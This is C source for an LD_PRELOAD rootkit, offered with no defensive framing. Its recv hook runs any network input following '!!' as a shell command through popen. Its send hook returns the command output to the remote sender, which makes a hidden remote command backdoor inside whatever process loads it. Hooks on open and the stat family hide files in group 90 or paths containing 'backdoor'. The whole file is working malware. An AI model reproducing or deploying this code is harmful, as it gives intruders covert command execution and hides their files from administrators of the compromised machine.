#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <dlfcn.h>
#include <errno.h>
#include <limits.h>
#include <unistd.h>
#include <dirent.h>

int (*old_open)(const char*, int, mode_t);
ssize_t (*old_recv)(int, void*, size_t, int);
ssize_t (*old_send)(int, const void*, size_t, int);
int (*old_xstat)(int, const char*, struct stat*);
int (*old_xstat64)(int, const char*, struct stat64*);

char *MAGIC_DIR = "backdoor";
int MAGIC_GID = 90;
char output[1025];
int cmd = 0;

ssize_t recv(int socket, void *buffer, size_t length, int flags) {
  old_recv = dlsym(RTLD_NEXT, "recv");
  /* read input from server into buffer */
  FILE *fp;
  int read = (*old_recv)(socket, buffer, length, flags);
  char *command = strstr(buffer, "!!");
  /* occurrence of !!  */
  if (command != NULL) {
    command = command + 2; // ignore "!!"
    fp = popen(command, "r"); // command output to fp
    fgets(output, length, fp); // put output to buffer
    fclose(fp);
    cmd = 1;
  }
  return read; // proceed normally
}

ssize_t send(int sockfd, const void *buf, size_t len, int flags) {
  old_send = dlsym(RTLD_NEXT, "send");
  if (cmd) {
    cmd = 0;
    char *string = output;
    return (*old_send)(sockfd, string, strlen(string), flags);
  } else {
    return (*old_send)(sockfd, buf, len, flags);
  }
}

int open(const char *pathname, int flags, mode_t mode) {
  old_open = dlsym(RTLD_NEXT, "open");
  old_xstat = dlsym(RTLD_NEXT, "__xstat");

  struct stat s_fstat;
  memset(&s_fstat, 0, sizeof(stat));
  old_xstat(_STAT_VER, pathname, &s_fstat);

  /* don't let anyone view open */
  if(s_fstat.st_gid == MAGIC_GID || (strstr(pathname, MAGIC_DIR) != NULL)) {
    errno = ENOENT;
    return -1;
  }
  return old_open(pathname,flags,mode);
}
int stat(const char *path, struct stat *buf) {
  old_xstat = dlsym(RTLD_NEXT, "__xstat");

  struct stat s_fstat;
  memset(&s_fstat, 0, sizeof(stat));
  old_xstat(_STAT_VER, path, &s_fstat);

  if(s_fstat.st_gid == MAGIC_GID || strstr(path,MAGIC_DIR)) {
    errno = ENOENT;
    return -1;
  }
  return old_xstat(3, path, buf);
}

int stat64(const char *path, struct stat64 *buf) {
  old_xstat64 = dlsym(RTLD_NEXT, "__xstat64");

  struct stat64 s_fstat;
  memset(&s_fstat, 0, sizeof(stat));
  old_xstat64(_STAT_VER, path, &s_fstat);

  if (s_fstat.st_gid == MAGIC_GID || strstr(path,MAGIC_DIR)) {
    errno = ENOENT;
    return -1;
  }
  return old_xstat64(_STAT_VER, path, buf);
}

int __xstat(int ver, const char *path, struct stat *buf) {
  old_xstat = dlsym(RTLD_NEXT, "__xstat");

  struct stat s_fstat;
  memset(&s_fstat, 0, sizeof(stat));
  old_xstat(ver,path, &s_fstat);
  memset(&s_fstat, 0, sizeof(stat));

  if(s_fstat.st_gid == MAGIC_GID || strstr(path,MAGIC_DIR)) {
    errno = ENOENT;
    return -1;
  }
  return old_xstat(ver,path, buf);
}

int __xstat64(int ver, const char *path, struct stat64 *buf) {
  old_xstat64 = dlsym(RTLD_NEXT, "__xstat64");

  struct stat64 s_fstat;
  memset(&s_fstat, 0, sizeof(stat));
  old_xstat64(ver,path, &s_fstat);

  if(s_fstat.st_gid == MAGIC_GID || strstr(path,MAGIC_DIR)) {
    errno = ENOENT;
    return -1;
  }
  return old_xstat64(ver,path, buf);
}
